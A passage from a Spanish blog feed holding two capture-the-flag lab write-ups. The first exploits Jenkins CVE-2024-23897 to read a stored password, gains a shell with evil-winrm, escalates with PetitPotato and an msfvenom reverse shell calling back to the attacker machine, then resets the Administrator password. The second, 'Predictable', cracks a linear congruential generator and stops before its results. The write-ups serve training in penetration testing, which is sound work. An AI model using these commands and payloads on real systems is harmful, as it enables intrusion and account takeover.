                7735807 blocks of size 4096. 3942367 blocks available
</code></pre></div></div>

<p>Encontramos un fichero <strong>credenciales.txt</strong>. Lo descargamos a nuestra máquina con el comando <code class="language-plaintext highlighter-rouge">get</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get credenciales.txt 
getting file <span class="se">\c</span>redenciales.txt of size 95 as credenciales.txt <span class="o">(</span>30.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 30.9 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<p>En nuestro equipo leemos el contenido de dicho fichero:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>credenciales.txt 
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
</code></pre></div></div>

<p>De ese texto presumimos que hay un fichero <strong>perico.txt</strong> en el escritorio del usuario <strong>hacker.</strong></p>

<p>Ahora pasamos a ver si hay alguna vulnerabilidad en el servicio web. Como hemos visto antes, en el puerto <strong>6969</strong> hay un servicio web. Empezamos buscando información de que tecnología esta usando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb <span class="nt">-a</span> 3 http://192.168.200.4:6969
http://192.168.200.4:6969 <span class="o">[</span>200 OK] Cookies[JSESSIONID.d01cdd8a], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty<span class="o">(</span>10.0.11<span class="o">)]</span>, HttpOnly[JSESSIONID.d01cdd8a], IP[192.168.200.4], Jenkins[2.361.4], Jetty[10.0.11], OpenSearch[/opensearch.xml], Prototype, Script[text/javascript], Title[Panel de control <span class="o">[</span>Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
</code></pre></div></div>

<p>Vemos que está usando el framework <strong>Jenkins</strong> versión <strong>2.361.4</strong>.</p>

<h1 id="intrusión">Intrusión</h1>

<p>Buscamos en la web del incibe a ver si esa versión de Jenkins tiene alguna vulnerabilidad.  Vemos que hay una vulnerabilidad con CVE CVE-2024-23897 que permite la lectura arbitraria de archivos.</p>

<p><a href="https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins">https://www.incibe.es/incibe-cert/alerta-temprana/avisos/lectura-arbitraria-de-archivos-en-jenkins</a></p>

<p>Buscamos con <strong>searchsploit</strong> a ver si tenemos algún exploit disponible (si no encuentra probar a hacer searchsploit -u para actualizar la BBDD):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit jenkins CVE-2024-23897 

 Exploit Title               |  Path
<span class="nt">-----------------------------</span> <span class="nt">---------------------------------</span>
Jenkins 2.441 - Local File I | java/webapps/51993.py
</code></pre></div></div>

<p>Vemos que hay un exploit disponible, nos lo copiamos a nuestra carpeta de trabajo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/exploitdb/exploits/java/webapps/51993.py <span class="nb">.</span>
</code></pre></div></div>

<p>Ejecutamos el exploit y le indicamos la url con <strong>-u</strong> y el path del fichero con <strong>-p</strong>. En este caso no es necesario añadirle la unidad (c:):</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python 51993.py <span class="nt">-u</span> http://192.168.200.4:6969 <span class="nt">-p</span> /users/hacker/desktop/perico.txt
hacker:Perico69
</code></pre></div></div>

<p>Nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y las credenciales recién obtenidas:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 192.168.200.4 <span class="nt">-u</span> hacker <span class="nt">-p</span> Perico69
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<p>Vemos que privilegios tiene el usuario <strong>hacker</strong> en la máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv

INFORMACIàN DE PRIVILEGIOS
<span class="nt">--------------------------</span>

Nombre de privilegio          Descripci¢n                                  Estado
<span class="o">=============================</span> <span class="o">============================================</span> <span class="o">==========</span>
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Como tiene el privilegio <strong>SeImpersonatePrivilege</strong> habilitado procedemos a hacer la escalada usando alguna de las herramientas disponibles, en este caso <strong>PetitPotato</strong>. Nos descargamos el binario de su github:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
</code></pre></div></div>

<p>Para compartir ficheros con la máquina victima creamos un servidor samba en nuestra máquina. Usamos <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para crear el server, <strong>-smb2support</strong> para dar soporte a smb2, <strong>kali</strong> es el nombre que le doy al recurso compartido y <strong>.</strong> para compartir lo que tenemos en el directorio actual.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver <span class="nt">-smb2support</span> kali <span class="nb">.</span>               
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<p>Ejecutamos <strong>PetitPotato</strong> para obtener una <strong>cmd</strong>, pero vemos que persiste:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\d</span>esktop&gt; <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\P</span>etitPotato.exe 3 cmd

<span class="o">[</span>+] Malicious named pipe running on <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\p</span>etit<span class="se">\p</span>ipe<span class="se">\s</span>rvsvc.
<span class="o">[</span>+] Invoking EfsRpcQueryUsersOnFile with target path: <span class="se">\\</span>localhost/pipe/petit<span class="se">\C</span><span class="nv">$\</span>wh0nqs.txt.

<span class="o">[</span>+] The connection is successful.
<span class="o">[</span>+] ImpersonateNamedPipeClient OK.
<span class="o">[</span>+] OpenThreadToken OK.
<span class="o">[</span>+] DuplicateTokenEx OK.
<span class="o">[</span>+] CreateProcessAsUser OK.
Microsoft Windows <span class="o">[</span>Versi¢n 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\d</span>esktop&gt;
</code></pre></div></div>

<p>Vamos a intentar crear una shell reversa al ejecutar <strong>PetitPotato</strong>. Para ello, primero creamos un ejecutable con msfvenom para que nos de una shell reversa.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.200.100 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
</code></pre></div></div>

<p>La copiamos en la máquina victima:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; copy <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\s</span>hell.exe <span class="nb">.</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; <span class="nb">dir

    </span>Directorio: C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments

Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         7/2/2024  10:25 PM          73802 shell.exe
</code></pre></div></div>

<p>Nos ponemos a la escucha en nuestra máquina atacante y ejecutamos <strong>PetitPotato</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ocuments&gt; <span class="se">\\</span>192.168.200.100<span class="se">\k</span>ali<span class="se">\P</span>etitPotato.exe 2 .<span class="se">\s</span>hell.exe

<span class="o">[</span>+] Malicious named pipe running on <span class="se">\\</span>.<span class="se">\p</span>ipe<span class="se">\p</span>etit<span class="se">\p</span>ipe<span class="se">\s</span>rvsvc.
<span class="o">[</span>+] Invoking EfsRpcDecryptFileSrv with target path: <span class="se">\\</span>localhost/pipe/petit<span class="se">\C</span><span class="nv">$\</span>wh0nqs.txt.

<span class="o">[</span>+] The connection is successful.
<span class="o">[</span>+] ImpersonateNamedPipeClient OK.
<span class="o">[</span>+] OpenThreadToken OK.
<span class="o">[</span>+] DuplicateTokenEx OK.
<span class="o">[</span>+] CreateProcessAsUser OK.
</code></pre></div></div>

<p>Obtenemos la shell como <strong>nt authority\system</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 8889
listening on <span class="o">[</span>any] 8889 ...
connect to <span class="o">[</span>192.168.200.100] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.200.4] 62914
Microsoft Windows <span class="o">[</span>Versi?n 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>Ahora para obtener el acceso como <strong>Administrador</strong> lo que he hecho es cambiar la contraseña del usuario <strong>Administrador</strong> con <code class="language-plaintext highlighter-rouge">net user</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net user administrador Murrusko0
net user administrador Murrusko0
Se ha completado el comando correctamente.
</code></pre></div></div>

<p>Una vez cambiada nos conectamos usando dichas credenciales:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 192.168.200.4 <span class="nt">-u</span> administrador <span class="nt">-p</span> Murrusko0
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrador<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>chimichurri0<span class="se">\a</span>dministrador
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrador<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<p>Y con esto damos por finalizada la máquina.</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="AD" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Predictable</title><link href="/posts/predictable/" rel="alternate" type="text/html" title="Predictable" /><published>2024-07-02T00:00:00+00:00</published><updated>2024-07-02T00:00:00+00:00</updated><id>/posts/predictable</id><content type="html" xml:base="/posts/predictable/"><![CDATA[<p><img src="/assets/images/predictable/pred.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel muy difícil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver
</code></pre></div></div>

<p>Vemos que tiene los puertos 22 y 1111 abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,1111 <span class="nt">-v</span> 172.17.0.2
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 9.7p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 fa:76:8a:ad:3c:33:1b:58:65:ba:74:ca:8a:7b:03:33 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 bc:f7:8f:f4:2d:d6:c9:66:0f:a8:7c:79:32:af:a4:79 <span class="o">(</span>ED25519<span class="o">)</span>
1111/tcp open  lmsocialserver?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.11.9
|     Date: Tue, 25 Jun 2024 23:57:02 GMT
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Content-Length: 12161
|     Vary: Cookie
|     Set-Cookie: <span class="nv">session</span><span class="o">=</span>eyJzZWVkIjoxNzE5MzU5ODIyfQ.ZntZTg.hhPjeoeYGV9K7YuwoMZANlhLvKQ<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
|     Connection: close
|     &lt;<span class="o">!</span><span class="nt">--</span>
|     class prng_lcg:
|     9223372036854775783
|     __init__<span class="o">(</span>self, <span class="nv">seed</span><span class="o">=</span>None<span class="o">)</span>:
|     self.state <span class="o">=</span> seed
|     next<span class="o">(</span>self<span class="o">)</span>:
|     self.state <span class="o">=</span> <span class="o">(</span>self.state <span class="k">*</span> self.m + self.c<span class="o">)</span> % self.n
|     <span class="k">return </span>self.state
|     <span class="k">return </span>int
|     obtener_semilla<span class="o">()</span>:
|     <span class="k">return </span>time.time_ns<span class="o">()</span>
|     obtener_semilla_anterior<span class="o">()</span>:
|     <span class="k">return </span>obtener_semilla<span class="o">()</span> - 1
|     <span class="s1">'seed'</span> not <span class="k">in </span>session:
|     session[<span class="s1">'seed'</span><span class="o">]</span> <span class="o">=</span> obtener_semilla<span class="o">()</span>
|     prng_lcg<span class="o">(</span>session[<span class="s1">'seed'</span><span class="o">])</span>
|     prng_lcg<span class="o">(</span>session[<span class="s1">'seed'</span><span class="o">])</span>
|     semilla_anterior <span class="o">=</span> obtener_semilla_anterior<span class="o">()</span>
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|   Help: 
|     &lt;<span class="o">!</span>DOCTYPE HTML&gt;
|     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
|     &lt;title&gt;Error response&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;Error response&lt;/h1&gt;
|     &lt;p&gt;Error code: 400&lt;/p&gt;
|     &lt;p&gt;Message: Bad request syntax <span class="o">(</span><span class="s1">'HELP'</span><span class="o">)</span>.&lt;/p&gt;
|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;
|     &lt;/body&gt;
|_    &lt;/html&gt;
</code></pre></div></div>

<p>Vemos que es un servidor de <code class="language-plaintext highlighter-rouge">Werkzeug/3.0.3 Python/3.11.9</code> y lo que parece parte del código que usa la aplicación de la web.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">prng_lcg</span><span class="p">:</span>
    <span class="n">m</span> <span class="o">=</span> 
    <span class="n">c</span> <span class="o">=</span>
    <span class="n">n</span> <span class="o">=</span> <span class="mi">9223372036854775783</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">seed</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">seed</span>

    <span class="k">def</span> <span class="nf">next</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">state</span> <span class="o">*</span> <span class="n">self</span><span class="p">.</span><span class="n">m</span> <span class="o">+</span> <span class="n">self</span><span class="p">.</span><span class="n">c</span><span class="p">)</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">n</span>
        <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="n">state</span>

<span class="bp">...</span>

<span class="c1"># return int
</span><span class="k">def</span> <span class="nf">obtener_semilla</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">time</span><span class="p">.</span><span class="nf">time_ns</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">obtener_semilla_anterior</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">obtener_semilla</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1</span>
<span class="bp">...</span>

<span class="k">if</span> <span class="sh">'</span><span class="s">seed</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">obtener_semilla</span><span class="p">()</span>
<span class="n">gen</span> <span class="o">=</span> <span class="nf">prng_lcg</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">])</span>

<span class="bp">...</span>

<span class="n">gen</span> <span class="o">=</span> <span class="nf">prng_lcg</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">seed</span><span class="sh">'</span><span class="p">])</span>
<span class="n">semilla_anterior</span> <span class="o">=</span> <span class="nf">obtener_semilla_anterior</span><span class="p">()</span>

</code></pre></div></div>

<p>Buscando vemos que se trata de un script para la creación de números usando un <a href="https://en.wikipedia.org/wiki/Linear_congruential_generator">Linear_congruential_generator</a>. Para generar los números nos hace falta conocer los valores de <code class="language-plaintext highlighter-rouge">m</code> (multiplicador) y <code class="language-plaintext highlighter-rouge">c</code> (incremento). El valor de <code class="language-plaintext highlighter-rouge">n</code> (modulo) es conocido para nosotros, <code class="language-plaintext highlighter-rouge">9223372036854775783</code> . Buscando como hacer reversing a LCG he encontrado esta url <a href="https://tailcall.net/posts/cracking-rngs-lcgs/">https://tailcall.net/posts/cracking-rngs-lcgs/</a> que muestra como poder obtener los valores conociendo valores consecutivos.</p>

<p>Creamos el siguiente script en python para calcular los valores de <code class="language-plaintext highlighter-rouge">m</code> y <code class="language-plaintext highlighter-rouge">c</code>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">argparse</span>

<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">return </span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="nf">return </span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">y</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">g</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">n</span>

<span class="k">def</span> <span class="nf">crack_unknown_multiplier</span><span class="p">(</span><span class="n">modulus</span><span class="p">,</span> <span class="n">s0</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">s1</span> <span class="o">&lt;=</span> <span class="n">s0</span> <span class="ow">or</span> <span class="n">s0</span> <span class="o">&lt;=</span> <span class="n">s2</span><span class="p">:</span>
       <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">s1 debe ser mayor que s0, y s0 debe ser mayor que s2</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">multiplier</span> <span class="o">=</span> <span class="p">(</span><span class="n">s2</span> <span class="o">-</span> <span class="n">s1</span><span class="p">)</span> <span class="o">*</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">s1</span> <span class="o">-</span> <span class="n">s0</span><span class="p">,</span> <span class="n">modulus</span><span class="p">)</span> <span class="o">%</span> <span class="n">modulus</span>
    <span class="n">increment</span> <span class="o">=</span> <span class="p">(</span><span class="n">s1</span> <span class="o">-</span> <span class="n">s0</span><span class="o">*</span><span class="n">multiplier</span><span class="p">)</span> <span class="o">%</span> <span class="n">modulus</span>
    <span class="k">return</span> <span class="n">modulus</span><span class="p">,</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">increment</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Crack LCG</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--n</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Modulus</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s0</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 0</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s1</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 1</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--s2</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Valor 2</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">modulus</span><span class="p">,</span> <span class="n">multiplier</span><span class="p">,</span> <span class="n">increment</span> <span class="o">=</span> <span class="nf">crack_unknown_multiplier</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">n</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s0</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s1</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">s2</span><span class="p">)</span>

        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Modulus(n): </span><span class="si">{</span><span class="n">modulus</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Multiplier(m): </span><span class="si">{</span><span class="n">multiplier</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Increment(c): </span><span class="si">{</span><span class="n">increment</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Entramos a la web y tenemos que encontrar 3 valores consecutivos donde <code class="language-plaintext highlighter-rouge">s1 &gt; s0</code> y <code class="language-plaintext highlighter-rouge">s1 &gt; s2</code>.</p>

<p><img src="/assets/images/predictable/1.png" alt="image" /></p>

<p>Ejecutamos el script introduciendo los valores como argumentos y nos da como resultado lo siguiente:</p>

